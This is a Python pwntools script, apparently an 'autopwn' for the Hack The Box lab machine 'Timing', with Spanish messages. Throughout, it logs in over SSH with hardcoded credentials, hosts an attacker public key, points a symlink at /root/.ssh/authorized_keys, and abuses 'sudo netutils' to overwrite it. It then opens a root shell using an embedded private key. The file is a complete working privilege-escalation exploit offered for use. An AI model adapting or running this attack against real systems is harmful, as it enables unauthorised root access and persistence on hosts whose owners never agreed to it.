try:
    from pwn import *
    print("\n[\033[1;32m+\033[1;37m] Autopwn Timing ~ GatoGamer1155\n")
except:
    print("\n[\033[1;31m!\033[1;37m] El script necesita privilegios de root\n\n[\033[1;31m!\033[1;37m] Recuerda tener instalada la libreria pwntools\n")
    exit(1)

def kill(sig, frame):
    print("\n[\033[1;31m-\033[1;37m] Saliendo\n")
    sys.exit(1)

signal.signal(signal.SIGINT, kill)

rsa = ("-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAArAAAABNlY2RzYS\n1zaGEyLW5pc3RwNTIxAAAACG5pc3RwNTIxAAAAhQQAV+el7yuxnYFf7OIrTmrtkcCc+SIX\nB2Kx57Iy7C6tqnRt9a75XTAg+BMLS2bBVu5GOfUJmzb1MdGwS3qXjng8P2EA3x5Wbk3QKX\n53brevFwG7DTCJ+Y4w+rO7LGcUx26pNS0IOTPTlOiIAmW55vDm1X0XRVR1yQkZKAuY6JyE\nMyaO5JcAAAEQabjlkWm45ZEAAAATZWNkc2Etc2hhMi1uaXN0cDUyMQAAAAhuaXN0cDUyMQ\nAAAIUEAFfnpe8rsZ2BX+ziK05q7ZHAnPkiFwdiseeyMuwurap0bfWu+V0wIPgTC0tmwVbu\nRjn1CZs29THRsEt6l454PD9hAN8eVm5N0Cl+d263rxcBuw0wifmOMPqzuyxnFMduqTUtCD\nkz05ToiAJluebw5tV9F0VUdckJGSgLmOichDMmjuSXAAAAQgDqFgsGASYZOcTRf2U760nc\nmu4YpvT7/Q0vKEuz9l70jUalAI/F9nf08dpXjE/2/BiUNKXDvaVYUW1eFaIBu3W4aAAAAB\nJFQ0RTQSA1MjEgYml0IEtleXM=\n-----END OPENSSH PRIVATE KEY-----")
pub = (b"ecdsa-sha2-nistp521 AAAAE2VjZHNhLXNoYTItbmlzdHA1MjEAAAAIbmlzdHA1MjEAAACFBABX56XvK7GdgV/s4itOau2RwJz5IhcHYrHnsjLsLq2qdG31rvldMCD4EwtLZsFW7kY59QmbNvUx0bBLepeOeDw/YQDfHlZuTdApfndut68XAbsNMIn5jjD6s7ssZxTHbqk1LQg5M9OU6IgCZbnm8ObVfRdFVHXJCRkoC5jonIQzJo7klw== ECDSA 521 bit Keys")

os.system('echo "%s" > key' % (rsa))

def server():
    req = ssh(host='10.10.11.135', user='aaron', password='S3cr3t_unGu3ss4bl3_p422w0Rd')
    server = req.process("/bin/sh")
    server.sendline(b"mkdir privesc; cd privesc; echo '%s' > root; python3 -m http.server 8000" % (pub))

threading.Thread(target=server, args=()).start()
time.sleep(5)
conn = ssh(host='10.10.11.135', user='aaron', password='S3cr3t_unGu3ss4bl3_p422w0Rd')
aaron = conn.process("/bin/sh")
aaron.sendline(b"ln -s -f /root/.ssh/authorized_keys root")
time.sleep(0.3)
aaron.sendline(b"sudo netutils")
time.sleep(0.3)
aaron.sendline(b"1")
time.sleep(0.3)
aaron.sendline(b"localhost:8000/root")
conn.exit()

time.sleep(2)
request = ssh(host='10.10.11.135', user='root', keyfile='key')
shell = request.process("/bin/sh")
shell.interactive()
